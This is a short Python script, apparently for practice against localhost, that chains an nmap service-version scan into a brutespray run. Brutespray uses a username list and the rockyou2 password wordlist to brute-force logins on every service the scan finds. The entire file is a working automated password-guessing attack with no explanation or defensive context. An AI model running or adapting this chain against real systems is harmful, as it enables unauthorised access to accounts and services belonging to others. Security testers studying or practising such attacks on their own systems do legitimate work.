import subprocess

if __name__ == "__main__":
	cmd = "nmap -sV 127.0.0.1 -oG output.gnmap"
	proc = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE)
	output, error = proc.communicate()
	print("===== nmap done ===========")
	print(output.decode('utf-8'))
	brute_cmd = "brutespray -f output.gnmap -U ../users.txt -P ../rockyou2.txt --threads 3 -c"
	brute_poc = subprocess.Popen(brute_cmd.split(), stdout=subprocess.PIPE)
	brute_out, brute_err = brute_poc.communicate()
	print("===== brutespray done =====")
	print(brute_out.decode('utf-8'))
